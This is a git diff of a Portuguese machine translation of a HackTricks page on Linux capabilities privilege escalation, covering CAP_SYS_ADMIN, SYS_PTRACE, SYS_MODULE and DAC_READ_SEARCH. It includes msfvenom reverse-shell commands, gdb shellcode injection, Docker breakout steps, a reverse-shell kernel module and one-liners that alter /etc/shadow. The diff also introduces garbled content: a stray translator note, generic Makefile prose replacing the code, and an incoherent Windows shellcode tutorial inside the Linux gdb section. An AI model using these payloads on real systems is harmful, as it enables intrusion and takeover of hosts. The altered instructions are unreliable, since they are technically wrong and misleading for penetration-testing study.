@@ -4,17 +4,17 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegrama**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.\\
+​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de segurança cibernética mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e segurança cibernética em todas as disciplinas.\\
 
 {% embed url="https://www.rootedcon.com/" %}
 
@@ -32,13 +32,13 @@ Vamos supor que estamos executando um processo como um usuário normal. Isso sig
 
 **CapEff**: O conjunto de capacidades _efetivas_ representa todas as capacidades que o processo está usando no momento (este é o conjunto real de capacidades que o kernel usa para verificações de permissão). Para capacidades de arquivo, o conjunto efetivo é, na verdade, um único bit que indica se as capacidades do conjunto permitido serão movidas para o conjunto efetivo ao executar um binário. Isso torna possível para binários que não são conscientes de capacidades fazer uso de capacidades de arquivo sem emitir chamadas de sistema especiais.
 
-**CapPrm**: (_Permitido_) Este é um superconjunto de capacidades que a thread pode adicionar a qualquer um dos conjuntos permitidos ou herdáveis da thread. A thread pode usar a chamada do sistema capset() para gerenciar capacidades: ela pode descartar qualquer capacidade de qualquer conjunto, mas só pode adicionar capacidades aos seus conjuntos efetivos e herdáveis da thread que estão em seu conjunto permitido da thread. Consequentemente, não pode adicionar nenhuma capacidade ao seu conjunto permitido da thread, a menos que tenha a capacidade cap\_setpcap em seu conjunto efetivo da thread.
+**CapPrm**: (_Permitido_) Este é um superset de capacidades que a thread pode adicionar a qualquer um dos conjuntos permitidos ou herdáveis da thread. A thread pode usar a chamada do sistema capset() para gerenciar capacidades: ela pode descartar qualquer capacidade de qualquer conjunto, mas só pode adicionar capacidades aos seus conjuntos efetivos e herdáveis da thread que estão em seu conjunto permitido da thread. Consequentemente, não pode adicionar nenhuma capacidade ao seu conjunto permitido da thread, a menos que tenha a capacidade cap\_setpcap em seu conjunto efetivo da thread.
 
-**CapInh**: Usando o conjunto _herdado_, todas as capacidades que podem ser herdadas de um processo pai podem ser especificadas. Isso impede que um processo receba quaisquer capacidades que não precise. Este conjunto é preservado em um `execve` e geralmente é definido por um processo que _recebe_ capacidades em vez de por um processo que está distribuindo capacidades para seus filhos.
+**CapInh**: Usando o conjunto _herdado_, todas as capacidades que podem ser herdadas de um processo pai podem ser especificadas. Isso impede que um processo receba quaisquer capacidades que não precise. Este conjunto é preservado em um `execve` e geralmente é definido por um processo que _recebe_ capacidades em vez de um processo que está distribuindo capacidades para seus filhos.
 
 **CapBnd**: Com o conjunto _limitado_, é possível restringir as capacidades que um processo pode receber. Somente as capacidades presentes no conjunto limitado serão permitidas nos conjuntos herdáveis e permitidos.
 
-**CapAmb**: O conjunto de capacidades _ambientais_ se aplica a todos os binários não SUID sem capacidades de arquivo. Ele preserva as capacidades ao chamar `execve`. No entanto, nem todas as capacidades no conjunto ambiental podem ser preservadas porque estão sendo descartadas caso não estejam presentes nos conjuntos herdáveis ou permitidos de capacidade. Este conjunto é preservado em chamadas `execve`.
+**CapAmb**: O conjunto de capacidades _ambientais_ se aplica a todos os binários não SUID sem capacidades de arquivo. Ele preserva as capacidades ao chamar `execve`. No entanto, nem todas as capacidades no conjunto ambiental podem ser preservadas porque estão sendo descartadas no caso de não estarem presentes nos conjuntos de capacidades herdáveis ou permitidos. Este conjunto é preservado em chamadas `execve`.
 
 Para uma explicação detalhada da diferença entre capacidades em threads e arquivos e como as capacidades são passadas para threads, leia as seguintes páginas:
 
@@ -50,7 +50,7 @@ Para uma explicação detalhada da diferença entre capacidades em threads e arq
 ### Capacidades de processos
 
 Para ver as capacidades de um processo específico, use o arquivo **status** no diretório /proc. Como ele fornece mais detalhes, vamos limitá-lo apenas às informações relacionadas às capacidades do Linux.\
-Observe que, para todas as informações de capacidade de processos em execução, elas são mantidas por thread, para binários no sistema de arquivos, elas são armazenadas em atributos estendidos.
+Observe que, para todas as informações de capacidade de processos em execução, são mantidas por thread, para binários no sistema de arquivos, elas são armazenadas em atributos estendidos.
 
 Você pode encontrar as capacidades definidas em /usr/include/linux/capability.h
 
@@ -74,7 +74,7 @@ CapEff: 0000003fffffffff
 CapBnd: 0000003fffffffff
 CapAmb: 0000000000000000
 ```
-Estes números hexadecimais não fazem sentido. Usando a ferramenta capsh, podemos decodificá-los em nomes de capacidades.
+Estes números hexadecimais não fazem sentido. Usando a ferramenta capsh, podemos decodificá-los em nome de capacidades.
 ```bash
 capsh --decode=0000003fffffffff
 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
@@ -132,7 +132,7 @@ Se descartarmos as capacidades CAP\_NET\_RAW para o _ping_, então a utilidade d
 ```bash
 capsh --drop=cap_net_raw --print -- -c "tcpdump"
 ```
-Além da saída do _capsh_ em si, o próprio comando _tcpdump_ também deve gerar um erro.
+Além da saída do _capsh_, o próprio comando _tcpdump_ também deve gerar um erro.
 
 > /bin/bash: /usr/sbin/tcpdump: Operação não permitida
 
@@ -161,7 +161,7 @@ cap_net_admin,cap_net_raw    jrnetadmin
 # Combining names and numerics
 cap_sys_admin,22,25          jrsysadmin
 ```
-## Capacidades de Ambiente
+## Capacidades do Ambiente
 
 Compilando o seguinte programa, é possível **iniciar um shell bash dentro de um ambiente que fornece capacidades**.
 
@@ -255,7 +255,7 @@ int main(int argc, char ** argv) {
   return 0;
 }
 ```
-{% endcode %} (This tag should not be translated)
+{% endcode %} (This is not a text to be translated, it's just a markdown tag)
 ```bash
 gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
@@ -270,9 +270,9 @@ Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 Você só pode adicionar capacidades que estão presentes nos conjuntos permitidos e herdáveis.
 {% endhint %}
 
-### Binários com Conhecimento de Capacidades/Binários sem Conhecimento de Capacidades
+### Binários com Conhecimento de Capacidade/Binários sem Conhecimento de Capacidade
 
-Os **binários com conhecimento de capacidades não usarão as novas capacidades** fornecidas pelo ambiente, no entanto, os **binários sem conhecimento de capacidades as usarão**, pois não as rejeitarão. Isso torna os binários sem conhecimento de capacidades vulneráveis dentro de um ambiente especial que concede capacidades aos binários.
+Os **binários com conhecimento de capacidade não usarão as novas capacidades** fornecidas pelo ambiente, no entanto, os **binários sem conhecimento de capacidade as usarão**, pois não as rejeitarão. Isso torna os binários sem conhecimento de capacidade vulneráveis dentro de um ambiente especial que concede capacidades aos binários.
 
 ## Capacidades de Serviço
 
@@ -337,11 +337,13 @@ setcap cap_setuid+ep /usr/bin/python2.7
 ```
 **Capacidades** necessárias pelo `tcpdump` para **permitir que qualquer usuário capture pacotes**:
 
-Para permitir que qualquer usuário capture pacotes com o `tcpdump`, é necessário que o binário tenha a capacidade `CAP_NET_RAW`. Isso pode ser feito com o seguinte comando:
+Para permitir que qualquer usuário capture pacotes usando o `tcpdump`, é necessário conceder a capacidade `CAP_NET_RAW` ao binário `tcpdump`. Isso pode ser feito usando o seguinte comando:
 
 ```
-sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
+sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
 ```
+
+Isso concederá a capacidade `CAP_NET_RAW` ao binário `tcpdump` localizado em `/usr/sbin/tcpdump`. Com essa capacidade, qualquer usuário poderá executar o `tcpdump` e capturar pacotes sem a necessidade de privilégios de root.
 ```bash
 setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
 getcap /usr/sbin/tcpdump
@@ -359,7 +361,7 @@ então **esse binário será executado como root**.
 
 ## CAP\_SYS\_ADMIN
 
-[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) é em grande parte uma capacidade geral, que pode facilmente levar a capacidades adicionais ou a root completo (geralmente acesso a todas as capacidades). `CAP_SYS_ADMIN` é necessário para realizar uma série de **operações administrativas**, o que é difícil de remover de contêineres se operações privilegiadas forem realizadas dentro do contêiner. Manter essa capacidade é frequentemente necessário para contêineres que imitam sistemas inteiros em comparação com contêineres de aplicativos individuais que podem ser mais restritivos. Entre outras coisas, isso permite **montar dispositivos** ou abusar do **release\_agent** para escapar do contêiner.
+[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) é em grande parte uma capacidade geral, que pode facilmente levar a capacidades adicionais ou a root completo (geralmente acesso a todas as capacidades). `CAP_SYS_ADMIN` é necessário para executar uma série de **operações administrativas**, o que é difícil de remover de contêineres se operações privilegiadas forem executadas dentro do contêiner. Manter essa capacidade é frequentemente necessário para contêineres que imitam sistemas inteiros em comparação com contêineres de aplicativos individuais que podem ser mais restritivos. Entre outras coisas, isso permite **montar dispositivos** ou abusar do **release\_agent** para escapar do contêiner.
 
 **Exemplo com binário**
 ```bash
@@ -406,7 +408,7 @@ Dentro da saída anterior, você pode ver que a capacidade SYS\_ADMIN está habi
 
 * **Montagem**
 
-Isso permite que o contêiner docker **monte o disco do host e acesse-o livremente**:
+Isso permite que o contêiner do docker **monte o disco do host e acesse-o livremente**:
 ```bash
 fdisk -l #Get disk name
 Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
@@ -420,8 +422,8 @@ chroot ./ bash #You have a shell inside the docker hosts disk
 ```
 * **Acesso total**
 
-No método anterior, conseguimos acessar o disco do host do Docker.\
-Caso você descubra que o host está executando um servidor **ssh**, você pode **criar um usuário dentro do disco do host do Docker** e acessá-lo via SSH:
+No método anterior, conseguimos acessar o disco do host do docker.\
+Caso você descubra que o host está executando um servidor **ssh**, você pode **criar um usuário dentro do disco do host do docker** e acessá-lo via SSH:
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
 fdisk -l
@@ -439,7 +441,7 @@ ssh john@172.17.0.1 -p 2222
 
 Isso significa que você pode escapar do contêiner injetando um shellcode dentro de algum processo em execução dentro do host. Para acessar processos em execução dentro do host, o contêiner precisa ser executado pelo menos com **`--pid=host`**.
 
-[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite o uso de `ptrace(2)` e chamadas de sistema de anexo de memória cruzada recentemente introduzidas, como `process_vm_readv(2)` e `process_vm_writev(2)`. Se essa capacidade for concedida e a chamada do sistema `ptrace(2)` em si não for bloqueada por um filtro seccomp, isso permitirá que um invasor ignore outras restrições seccomp, consulte [PoC para ignorar seccomp se ptrace for permitido](https://gist.github.com/thejh/8346f47e359adecd1d53) ou o **seguinte PoC**:
+[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite o uso de chamadas de sistema `ptrace(2)` e recentemente introduzidas, como `process_vm_readv(2)` e `process_vm_writev(2)`. Se essa capacidade for concedida e a chamada de sistema `ptrace(2)` em si não for bloqueada por um filtro seccomp, isso permitirá que um invasor ignore outras restrições seccomp, consulte [PoC para ignorar seccomp se ptrace for permitido](https://gist.github.com/thejh/8346f47e359adecd1d53) ou o **seguinte PoC**:
 
 **Exemplo com binário (python)**
 ```bash
@@ -535,69 +537,63 @@ libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
 **Exemplo com binário (gdb)**
 
-`gdb` com a capacidade `ptrace`:
+`gdb` com capacidade `ptrace`:
 ```
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
-# Criando um shellcode com msfvenom para injetar na memória via gdb
+# Crie um shellcode com msfvenom para injetar na memória via gdb
 
-Para criar um shellcode com o msfvenom, você pode usar o seguinte comando:
+O objetivo deste tutorial é criar um shellcode usando o msfvenom e injetá-lo na memória de um processo em execução usando o gdb.
 
-```
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f c
-```
+## Passo 1 - Crie o shellcode
 
-Substitua `<seu endereço IP>` pelo seu endereço IP e `<sua porta>` pela porta que você deseja usar para a conexão reversa.
-
-O parâmetro `-f c` indica que o formato de saída deve ser em C, o que é necessário para injetar o shellcode na memória via gdb.
-
-Depois de criar o shellcode, você pode injetá-lo na memória usando o gdb da seguinte maneira:
-
-1. Abra o gdb e anexe-o ao processo que você deseja atacar:
+Usando o msfvenom, crie um shellcode para o payload que você deseja injetar na memória. Por exemplo, para criar um shellcode para uma shell reversa do Windows, você pode usar o seguinte comando:
 
 ```
-gdb -p <PID>
+msfvenom -p windows/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f c -o shellcode
 ```
 
-Substitua `<PID>` pelo ID do processo que você deseja atacar.
+Este comando criará um shellcode para uma shell reversa do Windows que se conectará ao seu endereço IP e porta especificados. O shellcode será salvo em um arquivo chamado "shellcode".
 
-2. Crie um breakpoint em uma função que será chamada pelo processo:
+## Passo 2 - Inicie o processo de destino
 
-```
-break <função>
-```
-
-Substitua `<função>` pelo nome da função que você deseja usar como ponto de entrada para o shellcode.
-
-3. Execute o processo até que o breakpoint seja atingido:
+Inicie o processo de destino que você deseja injetar o shellcode na memória. Por exemplo, se você quiser injetar o shellcode em um processo chamado "target", você pode usar o seguinte comando:
 
 ```
-continue
+gdb target
 ```
 
-4. Use o comando `call` do gdb para injetar o shellcode na memória:
+## Passo 3 - Obtenha o endereço de memória do processo
+
+No gdb, use o comando "info proc map" para obter o endereço de memória do processo. Procure o intervalo de endereços que corresponde à seção de código do processo. Anote o endereço inicial desta seção.
+
+## Passo 4 - Injete o shellcode na memória
+
+No gdb, use o comando "set {unsigned char} <endereço> = <valor>" para injetar o shellcode na memória do processo. Substitua "<endereço>" pelo endereço inicial da seção de código do processo e "<valor>" pelo valor hexadecimal do primeiro byte do shellcode.
+
+Por exemplo, se o endereço inicial da seção de código do processo for "0x08048000" e o valor hexadecimal do primeiro byte do shellcode for "0x31", você pode usar o seguinte comando:
 
 ```
-call (void*)mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0)
+set {unsigned char} 0x08048000 = 0x31
 ```
 
-Este comando aloca uma página de memória com permissões de leitura, gravação e execução e retorna o endereço base da página.
+Em seguida, use o comando "set {unsigned char} <endereço + offset> = <valor>" para injetar o restante do shellcode na memória. Substitua "<endereço + offset>" pelo endereço inicial da seção de código do processo mais o deslocamento do byte atual do shellcode e "<valor>" pelo valor hexadecimal do byte atual do shellcode.
 
-5. Copie o shellcode para a página de memória alocada:
-
-```
-call (int)memcpy(<endereço da página>, <endereço do shellcode>, <tamanho do shellcode>)
-```
-
-Substitua `<endereço da página>` pelo endereço retornado pelo comando `mmap`, `<endereço do shellcode>` pelo endereço do shellcode e `<tamanho do shellcode>` pelo tamanho do shellcode.
-
-6. Execute o shellcode:
+Por exemplo, se o deslocamento do byte atual do shellcode for "0x01" e o valor hexadecimal do segundo byte do shellcode for "0xc0", você pode usar o seguinte comando:
 
 ```
-call (<tipo de função>)<endereço da página>()
+set {unsigned char} 0x08048001 = 0xc0
 ```
 
-Substitua `<tipo de função>` pelo tipo de função que você deseja usar para chamar o shellcode (por exemplo, `void` ou `int`) e `<endereço da página>` pelo endereço retornado pelo comando `mmap`.
+Continue injetando o restante do shellcode na memória usando este comando até que todo o shellcode tenha sido injetado.
+
+## Passo 5 - Execute o shellcode
+
+Use o comando "run" no gdb para continuar a execução do processo. O shellcode será executado e a conexão reversa será estabelecida com o seu endereço IP e porta especificados.
+
+## Conclusão
+
+Injetar um shellcode na memória de um processo em execução pode ser uma técnica útil para obter privilégios elevados em um sistema. Usando o msfvenom e o gdb, você pode criar e injetar um shellcode na memória de um processo de destino de forma rápida e fácil.
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
 buf =  b""
@@ -625,22 +621,27 @@ Depurar um processo root com gdb e copiar e colar as linhas do gdb geradas anter
 
 ```
 # Attach to the process
-gdb -p <pid>
+$ gdb -p <pid>
 
 # Enable debugging symbols
 (gdb) symbol-file /usr/lib/debug/.build-id/<debug-id>.debug
 
-# Set the breakpoint
-(gdb) break main
+# Set a breakpoint
+(gdb) break <function-name>
 
 # Continue execution
 (gdb) continue
 
-# Once the breakpoint is hit, set the uid/gid to 0
-(gdb) call setresuid(0, 0, 0)
-(gdb) call setresgid(0, 0, 0)
+# Once the breakpoint is hit, step through the code
+(gdb) step
 
-# Continue execution until the vulnerability is triggered
+# Print variable values
+(gdb) print <variable-name>
+
+# Modify variable values
+(gdb) set <variable-name> = <new-value>
+
+# Continue execution until the next breakpoint
 (gdb) continue
 ```
 ```bash
@@ -675,7 +676,7 @@ gdb -p 1234
 Você não será capaz de ver a saída do comando executado, mas ele será executado por aquele processo (para obter um shell reverso).
 
 {% hint style="warning" %}
-Se você receber o erro "No symbol "system" in current context.", verifique o exemplo anterior de carregamento de shellcode em um programa via gdb.
+Se você receber o erro "No symbol "system" in current context.", verifique o exemplo anterior carregando um shellcode em um programa via gdb.
 {% endhint %}
 
 **Exemplo com ambiente (Docker breakout) - Injeção de Shellcode**
@@ -704,7 +705,7 @@ Liste **processos** em execução no **host** `ps -eaf`
 ## CAP\_SYS\_MODULE
 
 [**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que o processo carregue e descarregue módulos do kernel arbitrários (chamadas de sistema `init_module(2)`, `finit_module(2)` e `delete_module(2)`). Isso pode levar a uma escalada de privilégios trivial e comprometimento do anel-0. O kernel pode ser modificado à vontade, subvertendo toda a segurança do sistema, módulos de segurança do Linux e sistemas de contêineres.\
-**Isso significa que você pode** **inserir/remover módulos do kernel no/do kernel da máquina hospedeira.**
+**Isso significa que você pode inserir/remover módulos do kernel no da máquina host.**
 
 **Exemplo com binário**
 
@@ -723,7 +724,7 @@ Em seguida, **compile o módulo do kernel que você pode encontrar 2 exemplos ab
 ```bash
 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
-Finalmente, execute o código Python necessário para carregar este módulo do kernel:
+Por fim, execute o código Python necessário para carregar este módulo de kernel:
 ```python
 import kmod
 km = kmod.Kmod()
@@ -786,22 +787,15 @@ module_exit(reverse_shell_exit);
 
 {% code title="Makefile" %}
 
-Este é um exemplo de um arquivo Makefile que pode ser usado para compilar um programa em C:
+O Makefile é um arquivo que contém um conjunto de regras que especificam como compilar e vincular um programa. Ele é usado para automatizar o processo de compilação e torná-lo mais fácil de gerenciar.
 
-```makefile
-CC=gcc
-CFLAGS=-Wall -Wextra -pedantic -std=c99
+Para compilar um programa usando um Makefile, basta executar o comando "make" no diretório onde o Makefile está localizado. O Makefile irá então compilar o programa de acordo com as regras especificadas.
 
-all: programa
+O Makefile é especialmente útil para projetos grandes e complexos, onde há muitos arquivos fonte e bibliotecas que precisam ser compilados e vinculados juntos. Ele permite que você especifique as dependências entre os arquivos e garante que apenas os arquivos que foram modificados desde a última compilação sejam recompilados.
 
-programa: programa.c
-	$(CC) $(CFLAGS) -o programa programa.c
+Além disso, o Makefile pode ser usado para executar outras tarefas relacionadas à compilação, como limpar arquivos temporários ou gerar documentação.
 
-clean:
-	rm -f programa
-```
-
-Este Makefile define duas regras: `all` e `clean`. A regra `all` compila o programa usando o compilador `gcc` com as opções de compilação definidas em `CFLAGS`. A regra `clean` remove o arquivo executável gerado pela regra `all`.
+{% endcode %}
 ```bash
 obj-m +=reverse-shell.o
 
@@ -814,7 +808,7 @@ clean:
 {% endcode %}
 
 {% hint style="warning" %}
-O caractere em branco antes de cada palavra "make" no Makefile **deve ser um tab, não espaços**!
+O caractere em branco antes de cada palavra make no Makefile **deve ser um tab, não espaços**!
 {% endhint %}
 
 Execute `make` para compilá-lo.
@@ -824,7 +818,7 @@ ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  S
 sudo apt update
 sudo apt full-upgrade
 ```
-Finalmente, inicie o `nc` dentro de um shell e **carregue o módulo** a partir de outro e você capturará o shell no processo nc:
+Finalmente, inicie o `nc` dentro de um shell e **carregue o módulo** de outro e você capturará o shell no processo nc:
 ```bash
 #Shell 1
 nc -lvnp 4444
@@ -838,7 +832,7 @@ Outro exemplo desta técnica pode ser encontrado em [https://www.cyberark.com/re
 
 ## CAP\_DAC\_READ\_SEARCH
 
-[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que um processo **ignore as permissões de leitura de arquivos e de leitura e execução de diretórios**. Embora tenha sido projetado para ser usado para pesquisar ou ler arquivos, ele também concede ao processo permissão para invocar `open_by_handle_at(2)`. Qualquer processo com a capacidade `CAP_DAC_READ_SEARCH` pode usar `open_by_handle_at(2)` para acessar qualquer arquivo, mesmo arquivos fora do seu namespace de montagem. O identificador passado para `open_by_handle_at(2)` é destinado a ser um identificador opaco recuperado usando `name_to_handle_at(2)`. No entanto, este identificador contém informações sensíveis e manipuláveis, como números de inode. Isso foi mostrado pela primeira vez como um problema em contêineres Docker por Sebastian Krahmer com o exploit [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).\
+[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que um processo **ignore as permissões de leitura de arquivos e de leitura e execução de diretórios**. Embora tenha sido projetado para ser usado para pesquisar ou ler arquivos, ele também concede permissão ao processo para invocar `open_by_handle_at(2)`. Qualquer processo com a capacidade `CAP_DAC_READ_SEARCH` pode usar `open_by_handle_at(2)` para acessar qualquer arquivo, mesmo arquivos fora do seu namespace de montagem. O identificador passado para `open_by_handle_at(2)` é destinado a ser um identificador opaco recuperado usando `name_to_handle_at(2)`. No entanto, este identificador contém informações sensíveis e manipuláveis, como números de inode. Isso foi mostrado pela primeira vez como um problema em contêineres Docker por Sebastian Krahmer com o exploit [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).\
 **Isso significa que você pode ignorar as verificações de permissão de leitura de arquivos e de leitura/execução de diretórios.**
 
 **Exemplo com binário**
@@ -865,7 +859,7 @@ print(open("/etc/shadow", "r").read())
 ```
 **Exemplo no Ambiente (Docker breakout)**
 
-Você pode verificar as capacidades habilitadas dentro do container Docker usando:
+Você pode verificar as capacidades habilitadas dentro do contêiner Docker usando:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -880,9 +874,9 @@ groups=0(root)
 ```
 Dentro da saída anterior, você pode ver que a capacidade **DAC\_READ\_SEARCH** está habilitada. Como resultado, o contêiner pode **depurar processos**.
 
-Você pode aprender como funciona a exploração a seguir em [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), mas, em resumo, **CAP\_DAC\_READ\_SEARCH** não apenas nos permite percorrer o sistema de arquivos sem verificações de permissão, mas também remove explicitamente quaisquer verificações em _**open\_by\_handle\_at(2)**_ e **pode permitir que nosso processo acesse arquivos sensíveis abertos por outros processos**.
+Você pode aprender como funciona a exploração a seguir em [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), mas, em resumo, **CAP\_DAC\_READ\_SEARCH** não só nos permite percorrer o sistema de arquivos sem verificações de permissão, mas também remove explicitamente quaisquer verificações em _**open\_by\_handle\_at(2)**_ e **pode permitir que nosso processo acesse arquivos sensíveis abertos por outros processos**.
 
-O exploit original que abusa dessas permissões para ler arquivos do host pode ser encontrado aqui: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), o seguinte é uma **versão modificada que permite indicar o arquivo que você deseja ler como primeiro argumento e despejá-lo em um arquivo.**
+O exploit original que abusa dessas permissões para ler arquivos do host pode ser encontrado aqui: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), o seguinte é uma **versão modificada que permite indicar o arquivo que você deseja ler como primeiro argumento e despejá-lo em um arquivo**.
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1033,7 +1027,7 @@ int main(int argc,char* argv[] )
 }
 ```
 {% hint style="warning" %}
-Eu exploro necessidades para encontrar um ponteiro para algo montado no host. O exploit original usava o arquivo /.dockerinit e esta versão modificada usa /etc/hostname. Se o exploit não estiver funcionando, talvez você precise definir um arquivo diferente. Para encontrar um arquivo que está montado no host, basta executar o comando mount:
+Eu exploro a necessidade de encontrar um ponteiro para algo montado no host. O exploit original usava o arquivo /.dockerinit e esta versão modificada usa /etc/hostname. Se o exploit não estiver funcionando, talvez você precise definir um arquivo diferente. Para encontrar um arquivo que está montado no host, basta executar o comando mount:
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (407) (1).png>)
@@ -1246,9 +1240,9 @@ ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 ```
 ## CAP\_FOWNER
 
-Isso significa que é possível alterar as permissões de qualquer arquivo.
+**Isso significa que é possível alterar as permissões de qualquer arquivo.**
 
-Exemplo com binário:
+**Exemplo com binário**
 
 Se o Python tiver essa capacidade, você pode modificar as permissões do arquivo shadow, **alterar a senha de root** e escalar privilégios:
 ```bash
@@ -1256,11 +1250,11 @@ python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
 ### CAP\_SETUID
 
-Isso significa que é possível definir o ID de usuário efetivo do processo criado.
+**Isso significa que é possível definir o id de usuário efetivo do processo criado.**
 
-Exemplo com binário
+**Exemplo com binário**
 
-Se o Python tiver essa **capacidade**, você pode facilmente abusar dela para escalar privilégios para root:
+Se o python tiver essa **capacidade**, você pode facilmente abusar dela para escalar privilégios para root:
 ```python
 import os
 os.setuid(0)
@@ -1277,9 +1271,9 @@ os.system("/bin/bash")
 ```
 ## CAP\_SETGID
 
-**Isso significa que é possível definir o ID de grupo efetivo do processo criado.**
+Isso significa que é possível definir o id do grupo efetivo do processo criado.
 
-Existem muitos arquivos que você pode **sobrescrever para escalar privilégios,** [**você pode obter ideias aqui**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
